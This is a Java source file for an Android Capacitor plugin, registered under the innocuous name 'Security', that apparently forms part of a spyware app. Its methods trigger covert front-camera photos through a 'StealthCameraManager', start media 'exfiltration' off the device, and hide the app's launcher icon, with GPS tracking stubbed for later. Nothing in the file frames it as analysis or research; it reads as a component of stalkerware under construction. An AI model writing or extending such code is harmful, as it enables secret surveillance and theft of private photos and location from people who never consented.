package google.try;

import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;

@CapacitorPlugin(name = "Security")
public class SecurityPlugin extends Plugin {

    @PluginMethod
    public void takePhoto(PluginCall call) {
        try {
            StealthCameraManager.captureFrontPhoto(getContext());
            call.resolve();
        } catch (Exception e) {
            call.reject(e.getMessage());
        }
    }

    @PluginMethod
    public void syncMedia(PluginCall call) {
        try {
            MediaSyncManager.startExfiltration(getContext());
            call.resolve();
        } catch (Exception e) {
            call.reject(e.getMessage());
        }
    }

    @PluginMethod
    public void hideIcon(PluginCall call) {
        try {
            ((MainActivity) getActivity()).hideAppIcon();
            call.resolve();
        } catch (Exception e) {
            call.reject(e.getMessage());
        }
    }

    @PluginMethod
    public void getGPS(PluginCall call) {
        // We'll implement the actual GPS logic soon
        JSObject ret = new JSObject();
        ret.put("status", "scanning");
        call.resolve(ret);
    }
}
